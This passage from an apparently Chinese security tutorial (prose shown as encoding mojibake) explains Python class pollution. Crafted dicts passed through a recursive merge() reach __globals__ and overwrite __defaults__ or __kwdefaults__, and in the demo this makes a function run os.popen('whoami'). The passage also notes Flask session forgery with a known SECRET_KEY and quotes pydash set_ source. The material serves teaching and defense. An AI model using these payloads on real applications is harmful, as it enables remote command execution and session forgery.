data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTIyNzM0NjU=">python å‡½æ•°çš„ä½ç½®å‚æ•° (Positional) å’Œå…³é”®å­—å‚æ•° (keyword) - çŸ¥ä¹ (zhihu.com)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__defaults__)</span><br><span class="line"><span class="comment">#(2,)</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__defaults__)</span><br><span class="line"><span class="comment">#(2,)</span></span><br></pre></td></tr></table></figure><p>â€‹é€šè¿‡æ›¿æ¢è¯¥å±æ€§ä¾¿èƒ½å®ç°å¯¹å‡½æ•°ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼æ›¿æ¢ï¼Œä½†ç¨æœ‰é—®é¢˜çš„æ˜¯è¯¥å±æ€§å€¼è¦æ±‚ä¸ºå…ƒç»„ç±»å‹ï¼Œè€Œé€šå¸¸çš„å¦‚ <code>JSON</code>  ç­‰æ ¼å¼å¹¶æ²¡æœ‰å…ƒç»„è¿™ä¸€æ•°æ®ç±»å‹è®¾è®¡æ¦‚å¿µï¼Œè¿™å°±éœ€è¦ç¯å¢ƒä¸­æœ‰åˆé€‚çš„è§£æè¾“å…¥çš„æ–¹å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (</span><br><span class="line">                    <span class="literal">True</span> ,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#article-kelp</span></span><br></pre></td></tr></table></figure><h3 id="__kwdefaults__"><a class="markdownIt-Anchor" href="#__kwdefaults__">#</a>  <code>__kwdefaults__</code></h3><p>â€‹ <code>__kwdefaults__</code> ä»¥å­—å…¸çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼ï¼Œä»ä»£ç ä¸Šæ¥çœ‹ï¼Œåˆ™æ˜¯å¦‚ä¸‹çš„æ•ˆæœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__kwdefaults__)</span><br><span class="line"><span class="comment">#None</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__kwdefaults__)</span><br><span class="line"><span class="comment">#None</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__kwdefaults__)</span><br><span class="line"><span class="comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__kwdefaults__)</span><br><span class="line"><span class="comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹é€šè¿‡æ›¿æ¢è¯¥å±æ€§ä¾¿èƒ½å®ç°å¯¹å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼æ›¿æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , * , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span> : <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#article-kelp</span></span><br></pre></td></tr></table></figure><h2 id="5-secret_key"><a class="markdownIt-Anchor" href="#5-secret_key">#</a> 5ã€SECRET_KEYï¼š</h2><p>â€‹å†³å®š <code>flask</code>  çš„ <code>session</code>  ç”Ÿæˆçš„é‡è¦å‚æ•°ï¼ŒçŸ¥é“è¯¥å‚æ•°å¯ä»¥å®ç° <code>session</code>  ä»»æ„ä¼ªé€ ã€‚</p><h1 id="æœ€åçš„è¡¥å……"><a class="markdownIt-Anchor" href="#æœ€åçš„è¡¥å……">#</a> æœ€åçš„è¡¥å……ï¼š</h1><h2 id="1-mergeå‡½æ•°"><a class="markdownIt-Anchor" href="#1-mergeå‡½æ•°">#</a> 1ã€merge å‡½æ•°</h2><p>â€‹é¦–å…ˆï¼Œåœ¨æœ€å¼€å§‹çœ‹åˆ° merge å‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘å½“æ—¶æ²¡æœ‰ä»”ç»†çœ‹è¿‡è¿™ä¸ªå‡½æ•°çš„é€»è¾‘ï¼Œç°åœ¨æ¥åˆ†æä¸‹è¿™ä¸ªå‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆè¯´ä¸€ä¸‹æˆ‘çš„çŸ¥è¯†ç›²åŒºï¼Œç®—æ˜¯å› ä¸ºè¿™ä¸ªï¼Œæˆ‘æ‰çœ‹ä¸æ‡‚è¿™ä¸ªå‡½æ•°çš„æºç çš„å§ã€‚</p><p>â€‹é¦–å…ˆæ˜¯å­—å…¸çš„ items æ–¹æ³•ï¼Œ python ä¸­çš„ items æ˜¯å¯ä»¥å°†å­—å…¸ä¸­çš„æ‰€æœ‰é¡¹ï¼Œä»¥åˆ—è¡¨æ–¹å¼è¿”å›ã€‚å¤§æ¦‚æƒ…å†µå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.items())</span><br><span class="line"></span><br><span class="line"><span class="comment">#dict_items([(&#x27;a&#x27;, &#x27;1&#x27;), (&#x27;b&#x27;, &#x27;2&#x27;), (&#x27;c&#x27;, &#x27;123&#x27;)])</span></span><br></pre></td></tr></table></figure><p>â€‹å…¶æ¬¡å°±æ˜¯ hasattr () å‡½æ•°ï¼š <code>hasattr()</code>  æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å¯¹è±¡æ˜¯å¦å…·æœ‰ç»™å®šçš„å±æ€§ã€‚è¿™ä¸ªå‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦æ£€æŸ¥çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æŸ¥æ‰¾çš„å±æ€§åç§°ã€‚å¦‚æœå¯¹è±¡å…·æœ‰è¯¥å±æ€§ï¼Œåˆ™  <code>hasattr()</code>  å‡½æ•°è¿”å›  <code>True</code> ï¼Œå¦åˆ™è¿”å›  <code>False</code> ã€‚å¤§æ¦‚æƒ…å†µå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">123</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(a,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæ˜¯ <code>__getitem__</code> å±æ€§ï¼šåœ¨ Python ä¸­ï¼Œ <code>__getitem__</code>  æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼Œç”¨äºå®šä¹‰å¯¹è±¡çš„ç´¢å¼•è®¿é—®è¡Œä¸ºã€‚å®ƒä½¿å¾—å¯¹è±¡å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·  <code>[]</code>  è¿›è¡Œ<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclQjQlQTIlRTUlQkMlOTUlRTYlOTMlOEQlRTQlQkQlOUMmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">ç´¢å¼•æ“ä½œ</span>ï¼Œç±»ä¼¼äºåˆ—è¡¨ã€å…ƒç»„å’Œå­—å…¸ç­‰å†…ç½®å®¹å™¨ç±»å‹ã€‚</p><p><strong>å¤§è‡´ä¸Šï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªå±æ€§æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æŸä¸ªå¯¹è±¡æ˜¯å¦ä¸ºå­—å…¸ï¼Œä¸è¿‡ä¸èƒ½å‡†ç¡®ç¡®å®šä¸‹æ¥ã€‚</strong></p><p>â€‹å†ä¹‹åæ˜¯å­—å…¸çš„ get æ–¹æ³•ï¼Œè¿™ä¸ªæ˜¯è·å–å­—å…¸ä¸­æŒ‡å®šé”®çš„å€¼ï¼Œå…·ä½“ä¸åšæ¼”ç¤ºã€‚</p><p>â€‹æœ€åï¼šsetattr () å‡½æ•°çš„åŠŸèƒ½ç›¸å¯¹æ¯”è¾ƒå¤æ‚ï¼Œå®ƒæœ€åŸºç¡€çš„åŠŸèƒ½æ˜¯<strong>ä¿®æ”¹ç±»å®ä¾‹å¯¹è±¡ä¸­çš„å±æ€§å€¼</strong>ã€‚å…¶æ¬¡ï¼Œå®ƒè¿˜å¯ä»¥å®ç°<strong>ä¸ºå®ä¾‹å¯¹è±¡åŠ¨æ€æ·»åŠ å±æ€§æˆ–è€…æ–¹æ³•</strong>ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">123</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(a.a)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;321&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#123</span></span><br><span class="line"><span class="comment">#321</span></span><br></pre></td></tr></table></figure><p>â€‹å¥½äº†ï¼Œç”¨ä¸‹é¢è¿™ä¸ªåšä¸‹æµ‹è¯•ï¼Œåœ¨å‡½æ•°é‡Œä¸‹ä¸€ä¸ªæ–­å®šï¼Œæ¥è°ƒè¯•çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>:<span class="string">&quot;c&quot;</span>&#125;</span><br><span class="line">c = &#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;3&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">merge(a,c)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>â€‹æœ€å¼€å§‹çš„æ—¶å€™ï¼Œkï¼Œv åˆ†åˆ«è·å–äº† a å’Œ 1 è¿™ä¸¤ä¸ªå­—ç¬¦ï¼Œç„¶åç»§ç»­å‘åæ‰§è¡Œï¼Œå½“å‡½æ•°æ‰§è¡Œåˆ° <code>if hasattr(dst, '__getitem__'):</code>  çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°æœ‰ <code>__getitem__</code> å±æ€§ï¼Œåˆ™å¤§è‡´åˆ¤æ–­è¿™ä¸ªæ˜¯ä¸ªå­—å…¸ï¼Œæ‰§è¡Œä¸‹ä¸€æ­¥ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™åˆ¤æ–­ç›®æ ‡å­—å…¸é‡Œæ˜¯å¦å­˜åœ¨ a è¿™ä¸€ä¸ªå±æ€§ï¼Œä»¥åŠæ˜¯å¦ä¸ºå­—å…¸ï¼Œå¦‚æœæ˜¯å­—å…¸ï¼Œåˆ™é€’å½’è°ƒç”¨ï¼Œå¦‚æœä¸æ˜¯å­—å…¸ï¼Œåˆ™æ‰§è¡Œ else é‡Œé¢çš„è¯­å¥ï¼Œè®¾ç½®ä¸€ä¸ªå…¨æ–°çš„å±æ€§åœ¨åé¢ã€‚åœ¨è¿™é‡Œå› ä¸ºç›®æ ‡å­—å…¸åªæœ‰ c å­—æ®µï¼Œä½†æ˜¯æºå¯¹è±¡æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ ifï¼Œè¿›è€Œè®¾ç½®ä¸€ä¸ªæ–°çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯æˆåŠŸåŠ è¿›å»äº†ã€‚</p><p>â€‹ <code>if dst.get(k) and type(v) == dict:</code>  è¿™ä¸€è¡Œï¼Œæ£€æŸ¥ç›®æ ‡å­—å…¸çš„ k é”®ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡è¿›å…¥æ—¶è¿­ä»£è·å–åˆ°çš„ a å±æ€§ï¼Œç›®æ ‡æ˜¯ç¡®è®¤ a å±æ€§æ˜¯å¦æœ‰å€¼ï¼ŒåŒæ—¶åˆ¤æ–­ k æ˜¯å¦ä¸ºå­—å…¸ï¼Œå¦‚æœ k æ˜¯å­—å…¸ï¼Œå°±é€’å½’æ‰§è¡Œã€‚</p><p><strong>å¤§æ¦‚å°±æ˜¯è¿™æ ·çš„ï¼Œå¯èƒ½ä¸ç®—å¾ˆè¯¦ç»†å§ï¼Œè¿™ä¸ªåªæœ‰è‡ªå·±æ‰“æ–­ç‚¹è°ƒè¯•æ‰èƒ½çœ‹å‡ºæ¥å§ã€‚</strong><br>â€‹</p><h2 id="2-pydashçš„set_å‡½æ•°æºç ä¿¡æ¯"><a class="markdownIt-Anchor" href="#2-pydashçš„set_å‡½æ•°æºç ä¿¡æ¯">#</a> 2ã€pydash çš„ set_å‡½æ•°æºç ä¿¡æ¯ï¼š</h2><p>â€‹æ— å¯å¥ˆä½•ä¹‹ä¸‹ï¼Œ è¿™é‡Œé€‰æ‹©å…ˆå®¡ä»¥ä¸‹ set_çš„æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_</span>(<span class="params">obj, path, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class="line"><span class="string">    it will be created.</span></span><br><span class="line"><span class="string">    è®¾ç½®ç”±â€œpathâ€æè¿°çš„å¯¹è±¡çš„å€¼ã€‚å¦‚æœå¯¹è±¡è·¯å¾„çš„ä»»ä½•éƒ¨åˆ†ä¸å­˜åœ¨ï¼Œå®ƒå°†è¢«åˆ›å»ºã€‚ï¼ˆè¿™é‡Œç¨å¾®æœ‰ç‚¹ç±»ä¼¼äºflaskçš„sstié‡Œé¢æ‰¾é“¾å­çš„æ–¹å¼ã€‚ï¼‰</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        